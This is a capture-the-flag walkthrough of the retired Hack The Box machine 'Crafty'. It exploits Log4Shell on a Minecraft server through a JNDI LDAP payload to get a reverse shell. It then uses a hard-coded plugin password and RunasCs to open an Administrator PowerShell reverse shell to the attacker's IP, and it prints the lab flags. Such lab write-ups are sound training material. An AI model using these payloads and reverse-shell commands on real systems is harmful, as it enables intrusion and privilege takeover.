# Crafty (Easy)

## <mark style="color:blue;">Description</mark>

* **Difficult** <mark style="color:green;">**->**</mark> Easy
* **OS** <mark style="color:green;">**->**</mark> Windows
* **State** <mark style="color:green;">-></mark> Retired
* **Tags&#x20;**<mark style="color:green;">**->**</mark> Web Application / Injections / Common Applications / Remote Code Execution\
  / Hard-coded Credentials / Batch / Java

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/machines/587">https://app.hackthebox.com/machines/587</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial port scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

{% code lineNumbers="true" %}
```bash
nmap -p- -Pn --min-rate 2500 -oN scan.txt 10.129.230.193
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (870).png" alt=""><figcaption></figcaption></figure>

***

* Then I did an exhaustive scan to learn more about the services running on the open ports

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -p80,25565 -sVC -oN serv_scan.txt 10.129.230.193
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (874).png" alt=""><figcaption></figcaption></figure>

***

* I found an HTTP service on port 80, so I tried accessing the content in the browser. I got redirected to the _crafty.htb_ domain, but couldn't get the content. So I added it to my list of known hosts in the _/etc/hosts_ file and visited again, this time having access to a page about a server for the popular game [_Minecraft_](https://www.minecraft.net/)&#x20;

<figure><img src="../../.gitbook/assets/image (872).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo "10.129.230.193 crafty.htb" >> /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
{% endhint %}

***

* I explored all the site buttons but got redirected to a _Coming Soon_ page with no relevant info. The only interesting thing I found was a domain that, with the context of the page, should be for the _Minecraft_ server that was running on the machine, as the previous scan also showed me

<figure><img src="../../.gitbook/assets/image (875).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>

***

* As I didn't have the game, I tried finding an alternative way to interact with this server. After much searching, I found a [repository](https://github.com/MCCTeam/Minecraft-Console-Client) with a console client to interact with the _Minecraft_ servers, which would log some interactions and let me send commands as if I were in the game. I downloaded the [last release](https://github.com/MCCTeam/Minecraft-Console-Client/releases/tag/20241227-281) on my machine and then executed the client specifying an arbitrary username with no password and the target IP

{% code overflow="wrap" lineNumbers="true" %}
```bash
./MinecraftClient-20241227-281-linux-x64 KryptoCoder "" 10.129.230.193
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (877).png" alt=""><figcaption></figcaption></figure>

***

* Now that I could interact with the server, I tried looking for any possible vulnerability related to this game version. After some research, I found an [official notification](https://www.minecraft.net/es-es/article/important-message--security-vulnerability-java-edition) about a previous security warning related to the [_Log4J_](https://logging.apache.org/log4j/2.x/index.html) login library. It was vulnerable to the well-known _Log4Shell_ vulnerability, so I started to find a way to exploit it, and fortunately, to facilitate the process, I found a [POC](https://github.com/kozmer/log4j-shell-poc) on _GitHub_

<figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (887).png" alt=""><figcaption><p>SNIPPET</p></figcaption></figure>

***

* I downloaded it, checked its structure, and noticed something I had to modify. In line 26 of the script, it was spawning a _/bin/sh_ binary, but changed it to _powershell.exe_ as our target was a _Windows_ machine. Then I set a listener with [_Netcat_](../../networks/tools-and-utilities.md#netcat) to catch the connection and reviewed the parameters needed, setting my IP to make the petition, an arbitrary port where the web server will be deployed, and the port where the listener was running

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp 4444
python3 poc.py --userip 10.10.14.137 --webport 8080 --lport 4444
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (881).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the _Log4Shell_ vulnerability and its exploitation, you can go [here](../../web-exploitation/broken-access-control/cve-log4shell.md)
{% endhint %}

***

* After executing it, I got several errors related to _Java_. I didn't understand what was wrong, so I reviewed the repository again and noticed that for this script to work, I would need a proper [JDK version](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html) in the repository. So I did that, with the JDK folder in the same place that the script was, and re-run it this time, deploying everything without a problem

<figure><img src="../../.gitbook/assets/image (888).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (889).png" alt=""><figcaption></figcaption></figure>

***

* After that, I inserted the payload for the _JNDI_ communication in the client and checked the script where I was notified about getting a request, confirming the petition was sent properly, and also checking the listener, I had caught a shell from the machine

{% code overflow="wrap" lineNumbers="true" %}
```bash
#Into the console client
> ${jndi:ldap://10.10.14.9:1389/a}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (883).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (884).png" alt=""><figcaption></figcaption></figure>

***

* Once inside, I went to the _Desktop_ of user where I found a _user.txt_ file, and reading its content, I retrieved the user flag

<figure><img src="../../.gitbook/assets/image (885).png" alt=""><figcaption></figcaption></figure>

***

* With that, I got the user flag

<figure><img src="../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

> Answer: _**286dda4cbcfb299d664f02c2511a543**_

***

* To find a way to escalate privileges, I started looking at the files under the server's folder. There I found files related to logs and configurations, but what caught my attention was the _plugins_ folder, as they are usually added externally from the base software and are well-known for being vulnerable on various types of applications. Checking the content of this folder, there was a _playercounter_ plugin that could be saving some interesting data about users

<figure><img src="../../.gitbook/assets/image (892).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (893).png" alt=""><figcaption></figcaption></figure>

***

* I checked the permissions we had on the folder, but we didn't have writing permissions, so we couldn't export or copy the content of the file. So I went to the root folder and created a _Temp_ folder, which will give me this advantage, then copied the file there and used [_certutil_](../../active-directory/tools-and-utilities-wip.md#certutil) to encode its content to base64 to prepare it for the transfer

{% code overflow="wrap" lineNumbers="true" %}
```powershell
icacls playercounter-1.0-SNAPSHOT.jar
cd C:\
New-Item Temp -ItempType Directory
Copy-Item C:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar .\plugin.jar
certutil -encode plugin.jar b64.txt
type b64.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

***

* Having the encoded content, I copied it to a file on my machine and reverted the encoding process with the base64 command, saving its content again to a _.jar_ file to have again the same file. Then I searched on the web for a [Java Decompiler](https://jdec.app/) and uploaded the file, being able to see the source code of the executable

{% code overflow="wrap" lineNumbers="true" %}
```bash
nano plugin.txt #Here I pasted the b64 string
cat plugin.txt | base64 -d > plugin.jar
file plugin.jar
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

***

* I understood that this plugin was connecting to a _rcon_ service and logging in locally using the _s67uB4zKqBIXw_ password and then doing the counting process. This leaked a possible password for a user under the system, maybe for the _Administrator_ user. So, to try logging in or, even better, to run commands as another user, I could try using the [_RunasCs_](../../active-directory/tools-and-utilities-wip.md#runascs) utility. To do so, I downloaded the binary on my machine and exported it to the target

{% code overflow="wrap" lineNumbers="true" %}
```powershell
#On my machine
python3 -m http.server 8000

#On the target machine
wget http://10.10.14.10:8000/RunasCs.exe -outFile RunasCs.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

***

* Then I set another [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener and tried using the binary to generate a Reverse Shell, spawning a PowerShell that would connect to my machine, specifying the proper credentials. With that, I successfully gained a shell as the _Administrator_ user

{% code overflow="wrap" lineNumbers="true" %}
```bash
#On my machine
nc -nvlp 7777

#On the target machine
.\RunasCs.exe Administrator s67uB4zKqBIXw powershell.exe -r 10.10.14.10:7777
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

***

* Finally, I went to the Desktop folder where I found a _root.txt_ file, and reading its content, I retrieved the root flag

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

***

* With that, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**ccd0681e8e2d4988e392984202922be3**_
